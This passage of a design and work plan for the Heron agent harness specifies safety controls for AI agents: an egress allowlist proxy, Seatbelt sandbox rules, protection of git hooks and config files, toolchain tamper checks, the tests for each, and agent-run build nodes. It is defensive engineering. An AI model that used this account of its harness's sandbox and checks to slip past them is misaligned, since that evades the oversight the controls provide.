        {"state": "changed", "toolchains": ["stable-aarch64-apple-darwin"], "files": ["bin/rustc"], "since": 1763900000, "during": "cargo install --path ."}
        {"state": "trusted"}
        {"state": "no_baseline"}
        ```
    *   `answer_approval`'s `dismiss` branch calls `Store::dismiss_approval`. Only when that returns true does it call `journal::answered(…, Dismissed)`, and `Resumer::declined` for `resume:` names. A lost claim answers 400 with "That request is no longer waiting." After #77, the `approve` branch is unchanged.
    *   `apply_settings` (`src/server.rs:347`) reads the flat key `"max_repeats": 4`. `1` gets 400 with "max_repeats must be 0 or at least 2."
*   **Proposed changes, W6b:**
    *   `apply_settings` reads `"egress": "allowlist"`, `"egress_allow": ["index.crates.io", …]` and `"deny_local_ports": [8080]`, and `GET /api/settings` returns them. The errors are 400s: "egress must be \"allowlist\" or \"open\".", "Not a host name: <entry>." and "Port 0 can't be denied."
    *   `start_endpoint` adds the bound port to the process-wide set of [§3.2](#32-the-egress-allowlist).
*   **Tests, W6a:**
    *   `toolchain_trust_needs_the_token`
    *   `dismiss_of_resume_approval_reaches_declined`
    *   `stale_dismiss_after_run_again_does_nothing`
    *   `max_repeats_one_is_refused`
*   **Tests, W6b:** `egress_settings_round_trip_and_validate`.

#### 12. `src/tools/shell.rs` (Modify, W6a and W6b)

*   **Proposed changes.** In `run`, wherever a sandbox is active:
    1.  **Before spawning (W6a):** call `toolchain::check`, and refuse if it is `Changed` and `names_rust_tool(command)`.
    2.  **The proxy (W6b):** when `cfg.agent.egress == "allowlist"` and the sandbox is Seatbelt, call `egress::start(cfg.agent.egress_allow)`. If it fails, refuse the command (§3.2).
    3.  **The profile (W6b):** build it with a fresh `protect::scan`, the egress rules, and the toolchain state. The denied ports are `cfg.server.port`, this process's bound ports and `deny_local_ports`.
    4.  **The environment (W6b):** after `env_allowed`, set the proxy variables.
    5.  **After the command, the timeout path included:**
        *   W6a appends `toolchain::note_after`, from a second `toolchain::check`;
        *   W6b appends `egress::blocked_note`, and the scan-limit line when the scan was cut off.

    On Linux, only steps 1 and 5's toolchain half apply. On Windows, none do.
*   **Tests.** These run real `sandbox-exec`, so the supervisor runs them. Like the existing shell tests, they skip when Seatbelt is unavailable (`if !seatbelt(&cfg) { return; }`), and inside a nested sandbox they can fail instead. Only the supervisor's run proves anything.
    *   **W6a:**
        *   `toolchain_change_is_reported_after_the_command`
        *   `toolchain_change_is_reported_after_a_timeout`
        *   `cargo_is_refused_while_the_toolchain_is_changed`
        *   `disguised_cargo_is_denied_by_the_profile`
    *   **W6b:**
        *   `sandboxed_curl_to_unlisted_host_is_blocked_and_named`
        *   `loopback_test_server_is_reachable`
        *   `dns_lookup_fails_in_sandbox`
        *   `shell_write_to_git_hook_is_denied`
        *   `own_api_port_is_denied_in_the_profile`
        *   `proxy_that_cannot_start_refuses_the_command`

    A real `cargo fetch` through the proxy needs the internet, so it is a prototype check (PT-E2), run again on the final build, not a unit test.

#### 13. Mac app, `macos/HeronMac/Sources/HeronCore/` and `macos/HeronMac/Sources/HeronUI/` (Modify, W8)

*   **Proposed changes:**
    *   **HeronCore:**
        *   `CoreClientProtocol` (`CoreClientProtocol.swift:6`) gains `toolchain() async throws -> ToolchainStatus` (`GET /api/toolchain`), `trustToolchain() async throws -> ToolchainStatus` (`POST /api/toolchain/trust`), and `setSandbox(egress: String, hosts: [String], denyPorts: [Int], maxRepeats: Int) async throws` (`POST /api/settings`).
        *   A wire model, `ToolchainStatus { state, toolchains, files, since, during }`.
        *   `CoreSettings` (`Models.swift:560`) gains `egress`, `egressAllow`, `denyLocalPorts` and `maxRepeats`.
        *   All three conformers implement the new methods: `CoreClient` (`CoreClient.swift:6`), `ManagedCoreClient` (`ManagedCoreClient.swift:12`) and `PreviewCoreClient` (`PreviewCoreClient.swift:6`).
    *   **HeronUI:** a **Sandbox** section in Settings, in `Views/` and `Stores/`, with:
        *   the egress mode;
        *   an editable host list and a list of denied local ports;
        *   the toolchain state, with **Trust the Rust toolchain as it is now**.
    *   Ask-again approvals need no change: they are ordinary parked approvals.
*   **Tests:** `SandboxSettingsTests` in the `HeronUITests` target (`Package.swift:20-21`): `test_sandboxSettingsShowsChangedToolchain`, `test_trustToolchainCallsCore` and `test_egressHostListRoundTrips`.

#### 14. Documents (Modify, W7)

*   **`docs/engineering/SECURITY_THREAT_MODEL.md`:** a "Harness safety" section with one entry per row of the [Risks and mitigations](#risks-and-mitigations) table. Each entry has a heading `#### HS-R<n>`, numbered in table order, so the check can count them.
*   **`docs/cli-providers.md`:** what breaks under the egress allowlist, and the default host list.
*   **`docs/designs/heron-harness2.md`** (present after Pre-S0). Pre-5 requires Harness2 to be updated in the same change when a name it relies on changes. These are the edits:
    *   **Its "Harness parts" list:** the toolchain check runs before and after each sandboxed command, and it depends on OQ1.
    *   **The repair's prepare step:**
        *   `toolchain::check` on the main store, then `export_baseline` and `import_baseline` into the child's database;
        *   a `protect::Snapshot` of the worktree before the child starts, and a diff after it exits, reported to the main inbox;
        *   `toolchain::check` again after the child exits.
    *   **The resumer:** `ActionIntent.tainted` is the trigger's `origin_tainted`, and `rerun` takes `tainted`.
    *   **If the owner picks OQ11's alternative,** the text on recording the action changes. **If the owner picks OQ1's stronger option,** the `toolchain::check` call is removed, and Pre-5 says so in a sentence containing "OQ1 stronger option", which W7's check looks for.

### Verification Plan

*   **Compilation and build:** `cargo build --locked`, `cargo build --locked --features desktop --bins`, and `swift build --package-path macos/HeronMac`.
*   **Unit tests:** each unit's check in the table below. Then `cargo test --locked` for the full suite, and `swift test --package-path macos/HeronMac`. They must run unsandboxed, because Heron's own shell and server tests need real Seatbelt and loopback binding.
*   **Static analysis:** `cargo clippy --locked --all-targets -- -D warnings`.
*   **CI:** the PR's CI passes on ubuntu, macos and windows (`.github/workflows/ci.yml:18`, `36`, which #78 tightens) before the PR is marked ready. That is G8's check.
*   **Test quality:** **testteeth**. `testteeth run --base main --fail-under 70` grades the branch by mutation, after Pre-S0's fast-forward.
    *   Every surviving mutant in `src/journal/`, `src/repeat/`, `src/egress/`, `src/protect/` and `src/toolchain/` is killed with a new test, or recorded as equivalent with evidence. verify's scope is `src/**`, so it can add those tests.
    *   One known equivalent: rusqlite's default 5 s busy timeout.
*   **genesis:** does not apply. Nothing in this doc judges or scores outputs. anchor-harness's genesis claims for egress and protection are cited as evidence for the ported design, not re-run here.
*   **End to end, by hand on the owner's Mac after `verify`:**
    *   CUJ 1, by killing the core during `sleep 30 && touch done` run through the shell;
    *   CUJ 7 and CUJ 8, in the app;
    *   all five prototype checks again (PT-E1, PT-E2, PT-P1, PT-P2 and PT-T1), on the final build.

**Goals to tests.**

| Goal | Tests |
|---|---|
| G1 | `crash_mid_call_asks_again_after_restart`, `crashed_job_call_asks_again_with_its_job_run_id`, `interrupted_parked_approval_is_asked_once`, `interrupted_tool_call_becomes_one_ask_again_approval`, `ask_pass_is_idempotent_after_a_crash_before_set_asked`, `identical_call_asks_while_its_ask_again_waits` |
| G2 | `interrupted_action_uses_its_label`, `run_again_on_resume_approval_calls_rerun`, `dismiss_of_resume_approval_reaches_declined`, `stale_dismiss_after_run_again_does_nothing`, `resume_approval_is_blocked_in_read_only_mode`, `resume_approval_passes_current_taint_to_rerun` |
| G3 | `alternating_two_call_loop_stops_the_turn_with_a_notice`, `failing_shell_call_with_changing_digits_stops`, `changing_success_output_does_not_stop`, `max_repeats_zero_keeps_only_the_nudge` |
| G4 | `git_hook_write_is_refused_in_every_mode`, `write_through_a_git_component_is_refused`, `shell_write_to_git_hook_is_denied`, `shell_profile_denies_protected_writes_after_the_writable_allowance` |
| G5 | `protected_change_during_turn_is_reported_once`, `protected_change_in_an_automation_is_reported`, `protected_change_in_run_parked_is_reported`, `truncated_scan_is_a_change` |
| G6 | `sandboxed_curl_to_unlisted_host_is_blocked_and_named`, `dns_lookup_fails_in_sandbox`, `loopback_test_server_is_reachable`, `proxy_that_cannot_start_refuses_the_command`; PT-E1 and PT-E2 on the final build |
| G7 | `toolchain_change_is_reported_after_the_command`, `toolchain_change_is_reported_after_a_timeout`, `cargo_is_refused_while_the_toolchain_is_changed`, `disguised_cargo_is_denied_by_the_profile`, `libexec_change_is_reported` |
| G8 | CI on all three operating systems; `cargo build --locked --features desktop --bins` |

**Run notes.**

*   **The supervisor.** skein runs completion commands itself, started outside Claude Code's sandbox (Pre-S3). The checks that need it are W3, W6a, W6b, W8 and verify, marked "supervisor" in the table. A failing check marks the node failed. The build session reads the check's output, then re-runs the node or adds a fix node.
*   **What a node agent runs itself.**
    *   It runs its check with the supervisor-only tests skipped: `--skip egress::proxy::net` for W3.
    *   In the agent's own sandbox, about 27 existing tests in `cli_llm`, `mail`, `telegram`, `tools::shell`, `agent` and `server` already fail, because loopback binding and nested Seatbelt are unavailable (seen in heron-v1's nodes, 2026-11-19). W6a's and W6b's new shell and server tests fail there the same way. The agent treats those failures as expected, and the supervisor's run decides.
    *   W8's backend runs `swift` outside the agent's sandbox.
    *   It confirms its test names with `cargo test --locked --lib -- --list | grep`. Both commands are allowed by `claude_build_rust`.
*   **Why `shell.rs` is in W6.** W6a changes `Profile::Shell`, which `src/tools/shell.rs:44` constructs. Splitting them would leave W6a's check unable to compile.
*   **Overlapping scopes.** W6a, W6b and verify each take `src/**`, which contains W1 to W5's folders. depends-on runs them in order. A later fix node for one of W1 to W5 can't start while W6a, W6b or verify runs.
*   **Timeouts.** The verify node gets `--verify-timeout 3600`.

## Work units

Each cargo check first runs `eval/require-tests.sh`, which exits 1 unless every named test exists. A `cargo test` filter that matches no test exits 0, and so does `--exact` with a missing name (checked on 2026-11-23: "0 passed; 486 filtered out"). So without the guard, a check would pass on Pre-S1's empty modules.

In the W7 and W8 rows, `\|` is the table's escape for `|`. For example, W8 runs `swift test … list | grep -cE '…(a|b|c)$'`.

| id | what to build | scope (one dir glob) | depends on | check (shell command that exits 0) | model role |
|---|---|---|---|---|---|
| W1 | Effect journal module: SQL functions, process leases, `guarded`, two-pass recovery, ask-again texts, the `Resumer` hook (§1, file 1) | `src/journal/**` | — | `bash eval/require-tests.sh --lib journal:: -- dead_process_intent_becomes_interrupted missing_lease_file_counts_as_dead a_live_process_intent_is_left_alone finished_rows_drop_their_arguments dropped_future_writes_cancelled timeout_inside_guarded_writes_failed interrupted_tool_call_becomes_one_ask_again_approval ask_pass_is_idempotent_after_a_crash_before_set_asked interrupted_parked_call_reopens_its_own_approval interrupted_action_uses_its_label pending_ask_again_matches_session_tool_and_args args_hash_ignores_key_order prune_keeps_open_rows answered_ask_again_rows_close_and_prune && cargo test --locked --lib -- journal::` | hardest tasks: opus high |
| W2 | `RepeatGuard` ported from anchor-harness `repeats.rs`, with the failure rule and one notice template (§2, file 2) | `src/repeat/**` | — | `bash eval/require-tests.sh --lib repeat:: -- identical_calls_stop_at_the_limit any_difference_resets_the_count limit_zero_disables_and_one_stops_immediately a_repeating_block_of_calls_is_a_loop failures_that_differ_only_in_digits_are_repeats same_call_count_is_three_after_three_identical_calls same_call_count_ignores_results shell_exit_code_line_counts_as_failure shell_timeout_counts_as_failure stop_text_uses_one_template && cargo test --locked --lib -- repeat::` | feature, refactoring: sonnet high |
| W3 | Egress proxy ported from anchor-harness `proxy.rs`, Seatbelt network rules, proxy env, blocked-host notes (§3.2, file 3). Supervisor | `src/egress/**` | — | `bash eval/require-tests.sh --lib egress:: -- decisions head_parsing refuses_disallowed_tunnels_over_the_wire wildcard_needs_a_real_label_and_ips_are_refused_even_if_listed dropping_the_proxy_closes_its_port oversized_request_head_is_dropped sni_is_read_from_a_client_hello client_hello_parser_edges only_public_addresses_are_reachable allowlisted_names_resolving_to_internal_addresses_are_refused the_tls_server_name_must_match_the_connect_host rules_deny_outbound_ip_except_loopback deny_local_port_overrides_loopback resolver_socket_is_denied_after_the_local_socket_rules daemon_sockets_are_denied blocked_hosts_are_named_once_with_their_reason default_list_excludes_crates_io host_entries_are_validated && cargo test --locked --lib -- egress::` | feature, refactoring: sonnet high |
| W4 | Protected list ported from anchor-harness `protect.rs`, `is_protected`, Seatbelt write rules, the bounded scan, snapshots and diff (§3.1, §3.3, file 4) | `src/protect/**` | — | `bash eval/require-tests.sh --lib protect:: -- scan_finds_repos_and_names_at_any_depth_but_skips_big_dirs file_tools_refuse_protected_names_and_git apply_protects_existing_repos_and_names snapshots_see_changes_to_protected_entries_only a_new_repository_may_hold_only_samples_and_plain_config claude_home_items_and_mcp_servers_are_snapshotted git_config_keys_are_parsed git_config_keys_on_the_header_line_are_seen a_quote_in_a_repo_path_keeps_the_profile_valid protected_names_match_at_any_depth git_file_resolves_to_common_dir git_component_in_a_write_path_is_protected new_repo_with_sample_hooks_is_not_a_change cloned_repo_with_branch_and_remote_keys_is_not_a_change new_repo_with_hooks_path_is_a_change default_heron_home_files_are_protected_when_heron_home_is_overridden heron_home_folder_itself_is_not_protected rules_return_repo_paths_for_refused_ancestors hooks_rule_allows_sample_names workspace_path_is_escaped_in_rules home_rules_only_cover_paths_inside_writable_folders scan_stops_at_the_limit_and_says_so truncated_scan_is_a_change snapshot_leaves_out_heron_db_and_leases snapshot_diff_reports_paths_only && cargo test --locked --lib -- protect::` | feature, refactoring: sonnet high |
| W5 | Toolchain manifest, stat-then-hash check, trust, `names_rust_tool`, `seatbelt_denies`, baseline export and import (§3.4, file 5). Starts after the owner answers OQ1, and is removed if OQ1's stronger option is chosen | `src/toolchain/**` | — | `bash eval/require-tests.sh --lib toolchain:: -- changed_binary_is_reported libexec_change_is_reported touch_without_content_change_stays_trusted new_toolchain_folder_is_a_change rust_src_and_docs_are_ignored names_rust_tool_finds_cargo_after_a_pipe names_rust_tool_skips_env_and_assignments changed_toolchain_is_read_denied no_baseline_adds_no_denies change_is_noticed_once trust_current_makes_state_trusted exported_baseline_imports_into_another_store && cargo test --locked --lib -- toolchain::` | feature, refactoring: sonnet high |
| W6a | Phase 1 wiring: `maintain` prune, `RunFrame`, `execute_call` journal and loop guard, transcript text, recovery calls, `run_parked` with `resume:` and the workspace check, `classify_path` and `Call::refusal`, the toolchain in the shell and profile, the toolchain and dismiss API (files 6 to 12, W6a parts). Supervisor | `src/**` | W1, W2, W4, W5 | `bash eval/require-tests.sh --lib -- maintain_prunes_finished_rows_after_30_days alternating_two_call_loop_stops_the_turn_with_a_notice failing_shell_call_with_changing_digits_stops changing_success_output_does_not_stop max_repeats_zero_keeps_only_the_nudge mutating_call_writes_intent_before_running read_only_call_writes_no_journal_row delegate_child_shares_the_run_frame automation_calls_share_the_job_run_frame repaired_transcript_says_the_call_may_have_finished identical_call_asks_while_its_ask_again_waits crash_mid_call_asks_again_after_restart crashed_job_call_asks_again_with_its_job_run_id ask_again_rerun_rechecks_current_policy ask_again_keeps_the_original_call_taint ask_again_in_another_workspace_is_blocked run_again_on_resume_approval_calls_rerun resume_approval_is_blocked_in_read_only_mode resume_approval_passes_current_taint_to_rerun unknown_resumer_sets_failed_with_unknown_handler_text interrupted_parked_approval_is_asked_once tick_recovery_runs_only_in_the_background_owner git_hook_write_is_refused_in_every_mode envrc_in_a_subfolder_is_refused zshrc_write_is_refused_not_asked write_through_a_git_component_is_refused refusal_names_the_protected_category protected_read_is_unchanged changed_toolchain_is_denied_in_the_profile cli_profile_has_no_egress_rules toolchain_trust_needs_the_token dismiss_of_resume_approval_reaches_declined stale_dismiss_after_run_again_does_nothing max_repeats_one_is_refused toolchain_change_is_reported_after_the_command toolchain_change_is_reported_after_a_timeout cargo_is_refused_while_the_toolchain_is_changed disguised_cargo_is_denied_by_the_profile && cargo test --locked --lib -- agent:: app:: permissions:: sandbox:: store:: server:: tools::` | hardest tasks: opus high |
| W6b | Phase 2 wiring, after PT-E1 passes: egress in the shell and profile, the Seatbelt protect rules, the run-end rehash and report, the egress settings and bound ports (files 7 to 12, W6b parts). Supervisor | `src/**` | W3, W6a | `bash eval/require-tests.sh --lib -- protected_change_during_turn_is_reported_once protected_change_in_an_automation_is_reported protected_change_in_run_parked_is_reported shell_profile_denies_protected_writes_after_the_writable_allowance egress_off_leaves_network_rules_out egress_rules_come_after_local_socket_rules egress_settings_round_trip_and_validate sandboxed_curl_to_unlisted_host_is_blocked_and_named loopback_test_server_is_reachable dns_lookup_fails_in_sandbox shell_write_to_git_hook_is_denied own_api_port_is_denied_in_the_profile proxy_that_cannot_start_refuses_the_command && cargo test --locked --lib -- agent:: app:: sandbox:: server:: tools::` | hardest tasks: opus high |
| W7 | Threat-model entries, one per Risks row; the egress section of the CLI providers guide; Harness2's Pre-5 edits (file 14) | `docs/**` | W6b | `test "$(grep -c '^#### HS-R' docs/engineering/SECURITY_THREAT_MODEL.md)" -ge 14 && grep -q 'egress allowlist' docs/cli-providers.md && grep -q 'index.crates.io' docs/cli-providers.md && grep -qE 'export_baseline\|OQ1 stronger option' docs/designs/heron-harness2.md` | feature, refactoring: sonnet high |
| W8 | Mac app Settings › Sandbox: egress mode and lists, toolchain state and Trust, all three `CoreClientProtocol` conformers (file 13). Supervisor | `macos/HeronMac/**` | W6b | `test "$(swift test --package-path macos/HeronMac list \| grep -cE 'SandboxSettingsTests/test_(sandboxSettingsShowsChangedToolchain\|trustToolchainCallsCore\|egressHostListRoundTrips)$')" -eq 3 && swift test --package-path macos/HeronMac --filter SandboxSettingsTests` | feature, refactoring: sonnet high |
| verify | Full suites, the desktop build, lint, and the test-quality gate on the branch; adds tests for surviving mutants. Supervisor | `src/**` | W6b, W7, W8 | `cargo test --locked && cargo build --locked --features desktop --bins && cargo clippy --locked --all-targets -- -D warnings && swift test --package-path macos/HeronMac && testteeth run --base main --fail-under 70` | feature, refactoring: sonnet high |
